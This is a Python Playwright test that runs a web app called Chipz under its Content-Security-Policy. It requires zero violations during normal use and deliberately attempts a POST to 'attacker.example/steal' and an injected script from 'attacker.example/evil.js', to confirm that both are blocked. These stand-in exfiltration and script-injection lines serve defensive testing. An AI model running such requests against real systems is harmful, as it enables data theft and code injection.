#!/usr/bin/env python3
"""
The Content-Security-Policy, checked by RUNNING the built app under it.

test-security-hardening.js reads the policy text and asserts it says the right
things. That is necessary and not sufficient: a policy can be perfectly worded
and still break the app, and this is the one change in the hardening round that
can take the whole product down for every member at once. A CSP violation is
also silent -- it is not a page error, so smoke-test.py cannot see it.

Two halves, and the second is what makes the first mean anything:

  1. Walk every tab and sheet with a `securitypolicyviolation` listener
     attached and require ZERO violations. Nothing the app legitimately does
     may be blocked.

  2. Deliberately attempt what the policy is FOR -- loading a script from an
     unlisted host and POSTing to an attacker origin -- and require both to be
     blocked. Without this, half 1 passes just as happily against a page with
     no policy at all, which is exactly the vacuous pass this suite has been
     bitten by before.

Same fixture rules as every Playwright test here: service_workers="block", and
Firebase's ESM modules stubbed at gstatic.
"""
import asyncio, json, os, sys, threading, http.server, socketserver, functools

PORT = int(os.environ.get('CSP_PORT', '8794'))
ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user')
API = 'https://chipz-server.onrender.com'

ACCOUNT = {"phone": "0742730382", "walletBalance": 2000, "totalDeposited": 58000,
           "totalEarned": 9840, "totalWithdrawn": 32164, "totalInvested": 28000,
           "checkinStreak": 2, "lastCheckinAt": None, "referralCode": "ML3Q4X",
           "publicId": "10012", "registrationDone": True,
           "team": {"l1": 3, "l2": 1, "l3": 0, "commission": 7840}}
PRODUCTS = [{"key": f"product-{i}", "name": f"Product-{i}", "price": p, "cycle": 150,
             "expectedReturn": p * 30, "image": ""}
            for i, p in enumerate([30000, 90000, 180000, 300000], start=1)]
TX = [{"id": "1", "type": "deposit", "amount": 28000, "displayAmount": 28000,
       "description": "Deposit: Pending (UGX 28,000)", "date": "05/09/2026", "time": "23:21"}]
ROUTES = {
    "/public/settings": {"status": "success", "settings": {
        "minDeposit": 30000, "minWithdraw": 20000, "withdrawFeePct": 15,
        "commL1": 28, "commL2": 1, "commL3": 1, "annEnabled": True,
        "annBody": "Welcome to Chipz.", "telegramGroup": "https://t.me/chipz",
        "depositPayAEnabled": True, "maintenanceMode": False,
        "openingCountdownEnabled": False}},
    "/public/products": {"status": "success", "products": PRODUCTS},
    "/public/activity-feed": {"status": "success", "feed": ["0771***382 withdrew UGX 25,500"]},
    "/public/banner": {"status": "success", "image": None},
    "/public/announcement-image": {"status": "success", "image": None},
    "/public/manual-pay-images": {"status": "success", "selector": None, "hero": None},
    "/public/chipz-images": {"status": "success", "referral": None, "logo": None},
    "/account": {"status": "success", "account": ACCOUNT},
    "/investments": {"status": "success", "investments": []},
    "/transactions": {"status": "success", "transactions": TX, "truncated": False},
    "/messages": {"status": "success", "messages": [
        {"id": "welcome", "title": "Welcome to Chipz", "body": "Earn daily income.",
         "date": "31/08/2026", "time": "08:59", "createdAt": 0, "read": False}]},
    "/bank/list": {"status": "success", "accounts": [
        {"id": "b1", "holder": "Test User", "network": "MTN Mobile Money", "phone": "0769968158"}]},
    "/team/stats": {"status": "success", "referralCode": "ML3Q4X",
                    "commRates": {"l1": 28, "l2": 1, "l3": 1},
                    "team": {"l1": 2, "l2": 0, "l3": 0}, "totalTeam": 2,
                    "teamCommission": 7840, "teamDeposits": 58000, "milestones": []},
    "/team/members": {"status": "success", "level": 1, "members": []},
}

FB_APP = "export const initializeApp=()=>({});export const getApps=()=>[];"
FB_AUTH = """
  const user={uid:'u1',email:'742730382@chipz-platform.com',getIdToken:async()=>'tok'};
  export const getAuth=()=>({currentUser:user});
  export const createUserWithEmailAndPassword=async()=>({user});
  export const signInWithEmailAndPassword=async()=>({user});
  export const signOut=async()=>{};
  export const updatePassword=async()=>{};
  export const reauthenticateWithCredential=async()=>{};
  export const EmailAuthProvider={credential:()=>({})};
  export const onAuthStateChanged=(a,cb)=>{setTimeout(()=>cb(user),0);};
"""

TABS = ["catalog", "products", "referral", "team", "account"]
SHEETS = ["openWalletSheet()", "openBalanceRecordSheet()", "openMessagesSheet()",
          "openChangeLoginPasswordSheet()", "openChangeTradePasswordSheet()",
          "openChestSheet()", "openDepositSheet()", "openWithdrawSheet()",
          "openHelpSheet()", "openAboutSheet()"]

failed = 0


def check(ok, label):
    global failed
    if not ok:
        failed += 1
    print(f"{'PASS' if ok else 'FAIL'}  {label}")


def serve():
    handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=ROOT)
    socketserver.TCPServer.allow_reuse_address = True
    httpd = socketserver.TCPServer(("127.0.0.1", PORT), handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd


async def main():
    from playwright.async_api import async_playwright
    async with async_playwright() as pw:
        browser = await pw.chromium.launch(executable_path="/opt/pw-browsers/chromium")
        ctx = await browser.new_context(viewport={"width": 390, "height": 860},
                                        service_workers="block")
        page = await ctx.new_page()
        page_errors = []
        page.on("pageerror", lambda e: page_errors.append(str(e)))

        async def api(route):
            path = "/" + route.request.url.split("://", 1)[-1].split("/", 1)[-1].split("?")[0]
            body = next((v for k, v in ROUTES.items() if path.endswith(k)), {"status": "success"})
            await route.fulfill(status=200, content_type="application/json", body=json.dumps(body))

        await page.route(f"{API}/**", api)
        await page.route("https://fonts.googleapis.com/**",
                         lambda r: asyncio.ensure_future(
                             r.fulfill(status=200, content_type="text/css", body="")))
        await page.route("https://www.gstatic.com/firebasejs/**/firebase-app.js",
                         lambda r: asyncio.ensure_future(
                             r.fulfill(status=200, content_type="text/javascript", body=FB_APP)))
        await page.route("https://www.gstatic.com/firebasejs/**/firebase-auth.js",
                         lambda r: asyncio.ensure_future(
                             r.fulfill(status=200, content_type="text/javascript", body=FB_AUTH)))

        # The listener has to be installed before ANY of the app's own script
        # runs, or the violations worth catching (the bundle itself, the
        # Firebase import) have already happened by the time it is attached.
        await page.add_init_script("""
          window.__cspViolations = [];
          document.addEventListener('securitypolicyviolation', e => {
            window.__cspViolations.push({
              directive: e.effectiveDirective || e.violatedDirective,
              blocked: e.blockedURI,
            });
          });
        """)

        await page.goto(f"http://127.0.0.1:{PORT}/index.html", wait_until="load")
        await page.wait_for_timeout(2500)

        # The policy must actually be in the shipped file -- if the meta tag
        # were lost in a rebuild, every assertion below would pass vacuously.
        meta = await page.evaluate(
            "(() => { const m = document.querySelector("
            "'meta[http-equiv=\"Content-Security-Policy\"]'); return m && m.content; })()")
        check(bool(meta), "the built index.html ships a CSP meta tag")
        check(bool(meta) and "connect-src" in meta, "and it carries a connect-src")

        check(not any("loading screen" in e for e in page_errors),
              "the app boots under the policy")
        still_loading = await page.evaluate(
            "(() => { const el = document.getElementById('loadingScreen');"
            " return !!el && getComputedStyle(el).display !== 'none'; })()")
        check(not still_loading, "the loading screen clears (the bundle was allowed to run)")

        # The whole app, the way a member walks it.
        await page.evaluate("document.getElementById('announceBg')"
                            " && document.getElementById('announceBg').classList.remove('show')")
        for tab in TABS:
            await page.evaluate(f"showPage('{tab}')")
            await page.wait_for_timeout(320)
        await page.evaluate("showPage('home')")
        await page.wait_for_timeout(400)
        for fn in SHEETS:
            await page.evaluate(f"try{{{fn}}}catch(e){{}}")
            await page.wait_for_timeout(300)
            await page.evaluate("try{closeSheet()}catch(e){}")
            await page.wait_for_timeout(110)

        violations = await page.evaluate("window.__cspViolations")

        # ONE expected violation, and it is the policy working as intended.
        #
        # build-core.js sets `disableConsoleOutput: true`, and that option makes
        # javascript-obfuscator emit a global-object helper shaped like:
        #     try { g = Function('return this')(); } catch (e) { g = window; }
        # The Function() constructor is eval, so 'unsafe-eval' would be needed
        # to run it -- and the answer is NOT to add 'unsafe-eval' for one
        # helper, which would hand any injected script the ability to build
        # code from a string. The helper is inside a try/catch whose fallback
        # is `window`, which in a browser is the same object it was reaching
        # for, so the block is caught and the bundle carries on. The app boots,
        # every tab and sheet opens, and the two checks above confirm it.
        #
        # Allowed NARROWLY -- this exact directive and this exact blocked URI.
        # Any other violation, including a second eval somewhere that is NOT
        # inside a try/catch, still fails this test.
        def expected(v):
            return v["directive"].startswith("script-src") and v["blocked"] == "eval"

        unexpected = [v for v in violations if not expected(v)]
        for v in unexpected:
            print(f"      blocked {v['directive']}: {v['blocked']}")
        check(len(unexpected) == 0,
              f"nothing the app legitimately does is blocked ({len(unexpected)} unexpected violations)")
        check(any(expected(v) for v in violations),
              "the obfuscator's Function('return this') helper is blocked and falls back cleanly")

        # Half 2. Prove the policy is switched on and doing its job, so half 1
        # cannot be a vacuous pass against an unenforced policy.
        await page.evaluate("window.__cspViolations = []")
        await page.evaluate("""
          (async () => {
            try { await fetch('https://attacker.example/steal', {method:'POST', body:'x'}); }
            catch (e) {}
            const s = document.createElement('script');
            s.src = 'https://attacker.example/evil.js';
            document.head.appendChild(s);
          })()
        """)
        await page.wait_for_timeout(900)
        blocked = await page.evaluate("window.__cspViolations")
        directives = {v["directive"] for v in blocked}
        check(any(d.startswith("connect-src") for d in directives),
              "a POST to an attacker origin is blocked by connect-src")
        check(any(d.startswith("script-src") for d in directives),
              "a script from an unlisted host is blocked by script-src")

        await browser.close()

    print("\nCSP runtime: all cases pass" if not failed else f"\n{failed} FAILED")
    return 1 if failed else 0


if __name__ == "__main__":
    httpd = serve()
    try:
        sys.exit(asyncio.run(main()))
    finally:
        httpd.shutdown()
